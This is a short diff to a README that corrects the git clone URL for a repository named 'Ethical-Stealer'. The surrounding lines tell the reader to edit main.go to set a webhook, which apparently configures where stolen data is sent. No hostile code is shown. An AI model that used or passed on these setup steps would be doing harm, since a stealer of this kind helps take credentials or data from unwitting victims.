@@ -33,7 +33,7 @@ By using this software, you agree to the [Commons Clause license](https://common
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/opiumsoftware/Ethical-Stealer.com
+   git clone https://github.com/opiumsoftware/Ethical-Stealer
 
 
 2. Edit main.go and switch the webhook on "Change webhook
